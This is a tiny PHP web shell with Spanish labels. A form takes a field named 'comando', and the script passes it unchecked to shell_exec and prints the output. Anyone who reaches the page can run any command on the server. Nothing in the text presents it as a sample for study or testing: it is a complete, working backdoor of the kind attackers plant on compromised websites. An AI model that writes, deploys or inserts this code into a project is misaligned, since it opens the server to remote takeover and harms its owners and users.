<form method="post">
<input type="text" name="comando">
<input type="submit" value="Ejecutar">
</form>
<?php

if(!empty($_POST["comando"]))
{
	$outx=shell_exec($_POST["comando"]); 
	echo "<pre>$outx</pre>";
}
?>
